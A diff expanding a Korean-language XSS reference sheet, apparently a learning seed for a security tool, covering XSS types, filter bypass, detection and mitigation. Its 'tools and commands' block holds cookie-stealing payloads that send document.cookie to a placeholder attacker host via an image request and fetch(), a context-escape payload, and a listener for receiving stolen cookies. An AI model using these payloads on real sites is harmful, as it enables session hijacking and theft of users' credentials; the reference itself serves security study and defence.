@@ -1,7 +1,29 @@
-# 학습 시드: xss (큐레이션 요약)
+# 학습 시드(심화): xss
 
-> 사전 심은 큐레이션 개념 요약(확립된 보안 지식). 라이브 수집 아님 — 권위 출처에서 검증 가능. 최신 본문은 `assassin --learn xss` 로 갱신.
+> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn xss`. P1: 머신별 라이트업 미참조.
 
-미검증 입력이 페이지에 실행 스크립트로 반영. Reflected/Stored/DOM. 쿠키탈취·세션하이재킹·키로깅. 완화: 출력 인코딩(문맥별), CSP, HttpOnly 쿠키, 입력검증.
+## 개요
+크로스사이트 스크립팅: 공격자 스크립트가 피해자 브라우저에서 실행. 세션탈취·키로깅·피싱. CWE-79.
+
+## 핵심 기법 · 열거
+- Reflected: 요청 파라미터가 즉시 응답에 반영
+- Stored: 서버 저장 후 다수 피해자에 전달(가장 위험)
+- DOM-based: 클라이언트 JS 의 안전하지 않은 sink(innerHTML·eval)
+- 컨텍스트별 페이로드(HTML/속성/JS/URL)·필터 우회(이벤트핸들러·인코딩)
+- 활용: document.cookie 반출·CSRF 토큰 탈취·BeEF 훅·관리자 세션
+
+## 표준 도구 · 명령
+```
+<script>new Image().src='http://<lhost>/c='+document.cookie</script>
+<img src=x onerror=fetch('http://<lhost>/'+document.cookie)>
+'"><svg onload=alert(document.domain)>           # 컨텍스트 탈출
+python3 -m http.server 80                          # 쿠키 수신
+```
+
+## 블루팀 탐지
+응답에 반영되는 <script>·onerror·onload. CSP 위반 리포트. 비정상 아웃바운드(쿠키 유출) 요청.
+
+## 완화
+출력 인코딩(컨텍스트별)·CSP(nonce)·HttpOnly 쿠키·입력 검증·프레임워크 자동 이스케이프.
 
 - 출처(검증): https://owasp.org/www-community/attacks/xss/
